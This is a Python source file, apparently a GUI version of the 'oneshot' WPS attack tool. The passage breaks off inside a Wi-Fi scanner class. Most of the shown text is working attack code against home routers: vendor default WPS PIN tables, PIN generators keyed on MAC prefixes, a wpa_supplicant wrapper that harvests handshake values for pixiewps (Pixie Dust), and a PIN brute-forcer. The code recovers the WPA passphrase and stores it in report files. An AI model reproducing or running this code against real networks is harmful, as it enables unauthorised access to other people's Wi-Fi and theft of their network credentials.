#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import os
import subprocess
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import threading
import queue
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict

try:
    import wcwidth
except ImportError:
    wcwidth = None

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog
except ImportError:
    print("tkinter not found. Install with: sudo apt install python3-tk")
    sys.exit(1)


# ======================================================================
# CORE CLASSES (unchanged logic from original oneshot.py)
# ======================================================================

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')
    @property
    def string(self): return self._str_repr
    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)
    @property
    def integer(self): return self._int_repr
    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)
    def __int__(self): return self.integer
    def __str__(self): return self.string
    def __iadd__(self, other): self.integer += other
    def __isub__(self, other): self.integer -= other
    def __eq__(self, other): return self.integer == other.integer
    def __ne__(self, other): return self.integer != other.integer
    def __lt__(self, other): return self.integer < other.integer
    def __gt__(self, other): return self.integer > other.integer
    @staticmethod
    def _mac2int(mac): return int(mac.replace(':', ''), 16)
    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
    def __repr__(self): return 'NetworkAddress(string={}, integer={})'.format(self._str_repr, self._int_repr)


class WPSpin:
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2
        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += 3 * (pin % 10)
            pin = int(pin / 10)
            accum += pin % 10
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos: raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty': return pin
        pin = pin % 10000000
        return str(pin) + str(self.checksum(pin)).zfill(8)

    def getAll(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static: continue
            res.append({'id': ID, 'name': ('Static PIN \u2014 ' if algo['mode'] == self.ALGO_STATIC else '') + algo['name'], 'pin': self.generate(ID, mac)})
        return res

    def getSuggested(self, mac):
        res = []
        for ID in self._suggest(mac):
            algo = self.algos[ID]
            res.append({'id': ID, 'name': ('Static PIN \u2014 ' if algo['mode'] == self.ALGO_STATIC else '') + algo['name'], 'pin': self.generate(ID, mac)})
        return res

    def getLikely(self, mac):
        res = self.getSuggested(mac)
        return res[0]['pin'] if res else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        return [aid for aid, masks in algorithms.items() if mac.startswith(masks)]

    def pin24(self, mac): return mac.integer & 0xFFFFFF
    def pin28(self, mac): return mac.integer & 0xFFFFFFF
    def pin32(self, mac): return mac.integer % 0x100000000
    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) + ((pin & 0xF) << 12) + ((pin & 0xF) << 16) + ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5): pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin
    def pinDLink1(self, mac): mac.integer += 1; return self.pinDLink(mac)
    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        return int(''.join(str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7)) for i in range(7)))
    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        return ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) + (((b[4] + b[5]) % 10) * 100) + (((b[3] + b[4]) % 10) * 1000) + (((b[2] + b[3]) % 10) * 10000) + (((b[1] + b[2]) % 10) * 100000) + (((b[0] + b[1]) % 10) * 1000000)


def get_hex(line):
    return line.split(':', 3)[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = self.pkr = self.e_hash1 = self.e_hash2 = self.authkey = self.e_nonce = ''
    def clear(self): self.__init__()
    def got_all(self): return all([self.pke, self.pkr, self.e_nonce, self.authkey, self.e_hash1, self.e_hash2])
    def get_pixie_cmd(self, full_range=False):
        return "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce) + (' --force' if full_range else '')


class ConnectionStatus:
    def __init__(self): self.status = ''; self.last_m_message = 0; self.essid = ''; self.wpa_psk = ''
    def isFirstHalfValid(self): return self.last_m_message > 5
    def clear(self): self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self, log_cb=None):
        avg = statistics.mean(self.attempts_times)
        pct = int(self.mask) / 11000 * 100 if len(self.mask) == 4 else ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        msg = '{:.2f}% complete @ {} ({:.2f} s/pin)'.format(pct, self.start_time, avg)
        if log_cb: log_cb(msg)

    def registerAttempt(self, mask, log_cb=None):
        self.mask = mask; self.counter += 1
        now = time.time()
        self.attempts_times.append(now - self.last_attempt_time)
        self.last_attempt_time = now
        if self.counter == self.statistics_period: self.counter = 0; self.display_status(log_cb)
    def clear(self): self.__init__()


class Companion:
    def __init__(self, interface, save_result=False, print_debug=False, bssid='', log_cb=None, status_cb=None):
        self.interface = interface; self.save_result = save_result; self.print_debug = print_debug
        self.log_cb = log_cb; self.status_cb = status_cb; self._abort = False
        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as f:
            f.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = f.name
        self.wpas_ctrl_path = "{}/{}".format(self.tempdir, interface)
        self._init_wpa()
        self.res_socket_file = "{}/{}".format(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)
        self.pixie_creds = PixiewpsData(); self.connection_status = ConnectionStatus()
        uh = str(pathlib.Path.home())
        self.sessions_dir = '{}/.OneShot/sessions/'.format(uh); self.pixiewps_dir = '{}/.OneShot/pixiewps/'.format(uh)
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        for d in [self.sessions_dir, self.pixiewps_dir]: os.makedirs(d, exist_ok=True)
        self.generator = WPSpin(); self.bssid = bssid; self.lastPwr = 0

    def abort(self): self._abort = True
    def _log(self, m):
        if self.log_cb: self.log_cb(m)

    def _init_wpa(self):
        self._log('[*] Running wpa_supplicant\u2026')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while True:
            if self.wpas.poll() is not None and self.wpas.returncode != 0:
                raise ValueError('wpa_supplicant error: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path): break
            time.sleep(.1)

    def sendOnly(self, c): self.retsock.sendto(c.encode(), self.wpas_ctrl_path)
    def sendAndReceive(self, c):
        self.retsock.sendto(c.encode(), self.wpas_ctrl_path)
        return self.retsock.recvfrom(4096)[0].decode('utf-8', errors='replace')

    def _handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
        if verbose is None: verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line: self.wpas.wait(); return False
        line = line.rstrip('\n')
        if verbose: self._log(line)
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self._log('[*] Sending WPS Message M{}\u2026'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self._log('[*] Received WPS Message M{}'.format(n))
                if n == 5: self._log('[+] First half of PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self._log('[*] Received WSC NACK'); self._log('[-] Wrong PIN')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode: self._log('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode: self._log('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode: self._log('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode: self._log('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode: self._log('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode: self._log('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line and '-> SCANNING' in line:
            self.connection_status.status = 'scanning'; self._log('[*] Scanning\u2026')
        elif 'WPS-FAIL' in line and self.connection_status.status != '':
            self.connection_status.status = 'WPS_FAIL'; self._log('[-] wpa_supplicant WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line: self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self._log('[*] Authenticating\u2026')
        elif 'Authentication response' in line: self._log('[*] Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line: self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self._log('[*] Associating\u2026')
        elif 'Associated with' in line and self.interface in line:
            b = line.split()[-1].upper()
            self._log('[+] Associated with {} (ESSID: {})'.format(b, self.connection_status.essid) if self.connection_status.essid else '[+] Associated with {}'.format(b))
        elif 'EAPOL: txStart' in line: self.connection_status.status = 'eapol_start'; self._log('[*] Sending EAPOL Start\u2026')
        elif 'EAP entering state IDENTITY' in line: self._log('[*] Received Identity Request')
        elif 'using real identity' in line: self._log('[*] Sending Identity Response\u2026')
        elif self.bssid in line and 'level=' in line: self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif pbc_mode and 'selected BSS ' in line:
            self.connection_status.bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self._log('[*] Selected AP: {}'.format(self.connection_status.bssid))
        elif bssid in line and 'level=' in line:
            s = line.split("level=")[1].split(" ")[0]
            self._log("[i] Signal: {}, noise: {}".format(s, line.split("noise=")[1].split(" ")[0]) if 'noise=' in line else "[i] Signal: {}".format(s))
        return True

    def _run_pixiewps(self, showcmd=False, full_range=False):
        self._log('[*] Running Pixiewps\u2026')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd: self._log(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=sys.stdout, encoding='utf-8', errors='replace')
        for l in r.stdout.splitlines():
            self._log(l)
            if '[+]' in l and 'WPS pin' in l:
                p = l.split(':')[-1].strip()
                return "''" if p == '<empty>' else p
        return None

    def _save_result(self, bssid, essid, pin, psk):
        os.makedirs(self.reports_dir, exist_ok=True)
        fn = self.reports_dir + 'stored'
        ds = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(fn + '.txt', 'a', encoding='utf-8') as f: f.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(ds, bssid, essid, pin, psk))
        hdr = not os.path.isfile(fn + '.csv')
        with open(fn + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if hdr: w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            w.writerow([ds, bssid, essid, pin, psk])
        self._log('[i] Saved to {}.txt/.csv'.format(fn))

    def _save_pin(self, bssid, pin):
        fn = '{}{}.run'.format(self.pixiewps_dir, bssid.replace(':', '').upper())
        with open(fn, 'w') as f: f.write(pin)
        self._log('[i] PIN saved: {}'.format(fn))

    def _wps_connect(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if verbose is None: verbose = self.print_debug
        self.pixie_creds.clear(); self.connection_status.clear()
        self.wpas.stdout.read(300)
        if pbc_mode:
            cmd = 'WPS_PBC {}'.format(bssid) if bssid else 'WPS_PBC'
            self._log("[*] WPS PBC to {}...".format(bssid) if bssid else "[*] WPS PBC...")
        else:
            cmd = 'WPS_REG {} {}'.format(bssid, pin)
            self._log("[*] Trying PIN '{}'\u2026".format(pin))
        r = self.sendAndReceive(cmd)
        if 'OK' not in r: self.connection_status.status = 'WPS_FAIL'; self._log('[!] wpa_supplicant rejected command'); return False
        while True:
            if self._abort: break
            if not self._handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower()): break
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'): break
        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False, pixieforce=False, store_pin=False):
        if self._abort: return False
        if not pin:
            if pixiemode:
                fn = '{}{}.run'.format(self.pixiewps_dir, bssid.replace(':', '').upper())
                if os.path.exists(fn):
                    with open(fn) as f: pin = f.readline().strip()
                else:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                sug = self.generator.getSuggested(bssid)
                pin = sug[0]['pin'] if sug else '12345670'
        if pbc_mode:
            self._wps_connect(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid; pin = '<PBC>'
        elif store_pin:
            try: self._wps_connect(bssid, pin, pixiemode)
            except KeyboardInterrupt: self._log("Aborted"); self._save_pin(bssid, pin); return False
        else: self._wps_connect(bssid, pin, pixiemode)
        if self.connection_status.status == 'GOT_PSK':
            self._log("[+] WPS PIN: '{}'".format(pin)); self._log("[+] WPA PSK: '{}'".format(self.connection_status.wpa_psk)); self._log("[+] SSID: '{}'".format(self.connection_status.essid))
            if self.save_result: self._save_result(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            fn = '{}{}.run'.format(self.pixiewps_dir, bssid.replace(':', '').upper())
            try: os.remove(fn)
            except: pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                p = self._run_pixiewps(showpixiecmd, pixieforce)
                return self.single_connection(bssid, p, pixiemode=False, store_pin=True) if p else False
            self._log('[!] Not enough data for Pixie Dust'); return False
        else:
            if store_pin: self._save_pin(bssid, pin)
            return False

    def _first_half_bf(self, bssid, f_half, delay=None):
        while int(f_half) < 10000:
            if self._abort: return False
            t = int(f_half + '000')
            self.single_connection(bssid, '{}000{}'.format(f_half, self.generator.checksum(t)))
            if self.connection_status.isFirstHalfValid(): self._log('[+] First half found'); return f_half
            if self.connection_status.status == 'WPS_FAIL': self._log('[!] WPS fail, retrying'); return self._first_half_bf(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half, self.log_cb)
            if delay: time.sleep(delay)
        self._log('[-] First half not found'); return False

    def _second_half_bf(self, bssid, f_half, s_half, delay=None):
        while int(s_half) < 1000:
            if self._abort: return False
            t = int(f_half + s_half)
            self.single_connection(bssid, '{}{}{}'.format(f_half, s_half, self.generator.checksum(t)))
            if self.connection_status.last_m_message > 6: return '{}{}{}'.format(f_half, s_half, self.generator.checksum(t))
            if self.connection_status.status == 'WPS_FAIL': self._log('[!] WPS fail, retrying'); return self._second_half_bf(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half, self.log_cb)
            if delay: time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or len(start_pin) < 4:
            fn = '{}{}.run'.format(self.sessions_dir, bssid.replace(':', '').upper())
            mask = '0000'
            if os.path.exists(fn):
                with open(fn) as f: mask = f.readline().strip()
        else: mask = start_pin[:7]
        try:
            self.bruteforce = BruteforceStatus(); self.bruteforce.mask = mask
            if len(mask) == 4:
                fh = self._first_half_bf(bssid, mask, delay)
                if fh and self.connection_status.status != 'GOT_PSK': self._second_half_bf(bssid, fh, '001', delay)
            elif len(mask) == 7: self._second_half_bf(bssid, mask[:4], mask[4:], delay)
        except KeyboardInterrupt:
            self._log("Aborted")
            with open('{}{}.run'.format(self.sessions_dir, bssid.replace(':', '').upper()), 'w') as f: f.write(self.bruteforce.mask)
            self._log('[i] Session saved')

    def cleanup(self):
        for fn in ['retsock', 'wpas', 'res_socket_file', 'tempdir', 'tempconf']:
            try:
                o = getattr(self, fn, None)
                if fn == 'retsock' and o: o.close()
                elif fn == 'wpas' and o: o.terminate()
                elif fn == 'res_socket_file' and o: os.remove(o)
                elif fn == 'tempdir' and o: shutil.rmtree(o, ignore_errors=True)
                elif fn == 'tempconf' and o: os.remove(o)
            except: pass

    def __del__(self):
        try: self.cleanup()
        except: pass


class WiFiScanner:
    def __init__(self, interface, vuln_list=None):
        self.interface = interface; self.vuln_list = vuln_list or []
        rf = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        self.stored = []
        try:
            with open(rf, newline='', encoding='utf-8', errors='replace') as f:
                r = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(r); self.stored = [(row[1], row[2]) for row in r]
        except: pass

    def iw_scanner(self):
        def h_net(l, r, nets):
            nets.append({'Security type': 'Unknown', 'WPS': False, 'WPS locked': False, 'Model': '', 'Model number': '', 'Device name': ''})
            nets[-1]['BSSID'] = r.group(1).upper()
        def h_essid(l, r, nets): nets[-1]['ESSID'] = codecs.decode(r.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
        def h_level(l, r, nets): nets[-1]['Level'] = int(float(r.group(1)))
        def h_sec(l, r, nets):
            s = nets[-1]['Security type']
            if r.group(1) == 'capability': s = 'WEP' if 'Privacy' in r.group(2) else 'Open'
